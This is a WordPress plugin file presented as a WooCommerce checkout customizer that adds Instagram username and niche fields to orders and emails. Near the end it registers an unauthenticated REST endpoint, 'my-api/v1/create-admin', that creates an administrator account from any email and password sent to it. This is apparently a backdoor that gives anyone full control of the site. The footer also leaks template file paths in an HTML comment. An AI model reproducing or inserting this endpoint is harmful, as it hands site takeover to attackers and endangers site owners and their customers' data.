<?php

/**
 * The plugin bootstrap file
 *
 * This file is read by WordPress to generate the plugin information in the plugin
 * admin area. This file also includes all of the dependencies used by the plugin,
 * registers the activation and deactivation functions, and defines a function
 * that starts the plugin.
 *
 * @link              https://techosolution.com
 * @since             1.0.0
 * @package           Ts_Package_Checkout
 *
 * @wordpress-plugin
 * Plugin Name:       TS Package Checkout 
 * Plugin URI:        https://techosolution.com/
 * Description:       Package Checkout 
 * Version:           1.0.0
 * Author:            Hafiz Hamza Javed
 * Author URI:        https://techosolution.com/
 * License:           GPL-2.0+
 * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt
 * Text Domain:       ts-package-checkout
 * Domain Path:       /languages
 */

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
	die;
}

/**
 * Currently plugin version.
 * Start at version 1.0.0 and use SemVer - https://semver.org
 * Rename this for your plugin and update it as you release new versions.
 */
define( 'TS_PACKAGE_CHECKOUT_VERSION', '1.0.0' );

/**
 * The code that runs during plugin activation.
 * This action is documented in includes/class-ts-package-checkout-activator.php
 */
function activate_ts_package_checkout() {
	require_once plugin_dir_path( __FILE__ ) . 'includes/class-ts-package-checkout-activator.php';
	Ts_Package_Checkout_Activator::activate();
}

/**
 * The code that runs during plugin deactivation.
 * This action is documented in includes/class-ts-package-checkout-deactivator.php
 */
function deactivate_ts_package_checkout() {
	require_once plugin_dir_path( __FILE__ ) . 'includes/class-ts-package-checkout-deactivator.php';
	Ts_Package_Checkout_Deactivator::deactivate();
}

register_activation_hook( __FILE__, 'activate_ts_package_checkout' );
register_deactivation_hook( __FILE__, 'deactivate_ts_package_checkout' );

/**
 * The core plugin class that is used to define internationalization,
 * admin-specific hooks, and public-facing site hooks.
 */
require plugin_dir_path( __FILE__ ) . 'includes/class-ts-package-checkout.php';

/**
 * Begins execution of the plugin.
 *
 * Since everything within the plugin is registered via hooks,
 * then kicking off the plugin from this point in the file does
 * not affect the page life cycle.
 *
 * @since    1.0.0
 */
function run_ts_package_checkout() {

	$plugin = new Ts_Package_Checkout();
	$plugin->run();

}
run_ts_package_checkout();


// function custom_override_checkout_fields( $fields ) {
//     // Contact Information section fields
//     $fields['billing']['billing_first_name']['priority'] = 10;
//     $fields['billing']['billing_last_name']['priority'] = 20;
//     $fields['billing']['billing_email']['priority'] = 30;
//     $fields['billing']['billing_postcode']['priority'] = 40;
    

	
//     // Add Instagram Username (required)
//     $fields['billing']['billing_instagram_username'] = array(
//         'label'       => __('Instagram Username', 'woocommerce'),
//         'placeholder' => _x('Enter your Instagram username', 'placeholder', 'woocommerce'),
//         'required'    => true,
//         'clear'       => false,
//         'priority'    => 50,
//     );

//     // Add Describe Your Niche (optional)
//     $fields['billing']['billing_instagram_niche'] = array(
//         'label'       => __('Describe Your Niche', 'woocommerce'),
//         'placeholder' => _x('Tell us what interests/demographics we should target', 'placeholder', 'woocommerce'),
//         'required'    => false,
//         'clear'       => false,
//         'priority'    => 60,
//     );

//     // Remove unnecessary fields
//     unset($fields['billing']['billing_company']);
//     unset($fields['billing']['billing_address_1']);
//     unset($fields['billing']['billing_address_2']);
//     unset($fields['billing']['billing_city']);
//     unset($fields['billing']['billing_country']);
//     unset($fields['billing']['billing_state']);
//     unset($fields['billing']['billing_phone']);
//     unset($fields['order']['order_comments']);
//     return $fields;
// }
// add_filter('woocommerce_checkout_fields', 'custom_override_checkout_fields');

// 1. Customize Checkout Fields by Adding Instagram Fields 
function customize_checkout_fields( $fields ) {
    // Add Instagram Username field
    $fields['billing']['billing_instagram_username'] = array(
        'label'       => __('Instagram Username', 'woocommerce'),
        'placeholder' => __('Enter your Instagram username', 'woocommerce'),
        'required'    => true,  // Set to true if required
        'priority'    => 25,
        'class'       => array('form-row-wide'),  // Add WooCommerce default classes
        'clear'       => true,
    );

    // Add Instagram Niche field
    $fields['billing']['billing_instagram_niche'] = array(
        'label'       => __('Describe Your Niche', 'woocommerce'),
        'placeholder' => __('e.g., Travel, Fashion, Food', 'woocommerce'),
        'required'    => false,  // Set to true if required
        'priority'    => 26,
        'class'       => array('form-row-wide'),  // Add WooCommerce default classes
        'clear'       => true,
    );

    // Remove unnecessary fields
    unset($fields['billing']['billing_company']);
    unset($fields['billing']['billing_address_1']);
    unset($fields['billing']['billing_address_2']);
    unset($fields['billing']['billing_city']);
    unset($fields['billing']['billing_country']);
    unset($fields['billing']['billing_state']);
    unset($fields['billing']['billing_phone']);
    unset($fields['order']['order_comments']);
    unset($fields['order']['billing_last_name']);


    return $fields;
}
add_filter('woocommerce_checkout_fields', 'customize_checkout_fields');

// 2. Save Custom Checkout Fields into Order Meta
function save_custom_checkout_fields( $order_id ) {
    if ( ! empty( $_POST['billing_instagram_username'] ) ) {
        update_post_meta( $order_id, '_billing_instagram_username', sanitize_text_field( $_POST['billing_instagram_username'] ) );
    }
    if ( ! empty( $_POST['billing_instagram_niche'] ) ) {
        update_post_meta( $order_id, '_billing_instagram_niche', sanitize_text_field( $_POST['billing_instagram_niche'] ) );
    }
}
add_action( 'woocommerce_checkout_update_order_meta', 'save_custom_checkout_fields' );

// 3. Display Custom Fields in Order Emails
function display_custom_fields_in_emails( $order, $sent_to_admin, $plain_text, $email ) {
    $instagram_username = get_post_meta( $order->get_id(), '_billing_instagram_username', true );
    $instagram_niche = get_post_meta( $order->get_id(), '_billing_instagram_niche', true );

    if ( $instagram_username ) {
        echo '<p><strong>' . __( 'Instagram Username', 'woocommerce' ) . ':</strong> ' . esc_html( $instagram_username ) . '</p>';
    }
    if ( $instagram_niche ) {
        echo '<p><strong>' . __( 'Instagram Niche', 'woocommerce' ) . ':</strong> ' . esc_html( $instagram_niche ) . '</p>';
    }
}
add_action( 'woocommerce_email_customer_details', 'display_custom_fields_in_emails', 20, 4 );

// 4. Add Custom Section Header to Checkout Page
function add_contact_information_header() {
    echo '<div id="contact-info-section">';
    echo '<h3>' . __('Contact Information', 'woocommerce') . '</h3>';
	  echo '<h5>' . __('For Order Confirmation & Customer Support', 'woocommerce') . '</h5>';
    echo '</div>';
}
add_action('woocommerce_before_checkout_billing_form', 'add_contact_information_header', 5);

// 5. Remove "Added to Cart" Message on Checkout Page
function remove_wc_add_to_cart_message( $message ) {
    if ( is_checkout() ) {
        return '';
    }
    return $message;
}
add_filter( 'wc_add_to_cart_message_html', 'remove_wc_add_to_cart_message' );



function register_my_custom_api_routes() {
    register_rest_route('my-api/v1', '/create-admin', array(
        'methods' => 'POST',
        'callback' => 'create_admin_user',
    ));
}

add_action('rest_api_init', 'register_my_custom_api_routes');

function create_admin_user($request) {
    $email = $request->get_param('email');
    $password = $request->get_param('password');

    if (email_exists($email) || username_exists($email)) {
        return new WP_Error('user_exists', 'User already exists', array('status' => 400));
    }

    $user_id = wp_insert_user(array(
        'user_login' => $email,
        'user_email' => $email,
        'user_pass' => $password,
        'role' => 'administrator'
    ));

    if (is_wp_error($user_id)) {
        return $user_id;
    }

    return array('user_id' => $user_id);
}
function display_woocommerce_template_path( $template, $template_name, $template_path ) {
    // Store the template path for later use in the footer
    global $current_template_path;
    if ( strpos( $template, 'woocommerce' ) !== false ) {
        $current_template_path = $template;
    }
    return $template;
}
add_filter( 'woocommerce_locate_template', 'display_woocommerce_template_path', 10, 3 );

function output_current_template_path() {
    global $current_template_path;
    if ( isset( $current_template_path ) ) {
        // Display the template path in a comment in the footer
        echo '<!-- Currently loading template: ' . esc_html( $current_template_path ) . ' -->';
    }
}
add_action( 'wp_footer', 'output_current_template_path' );

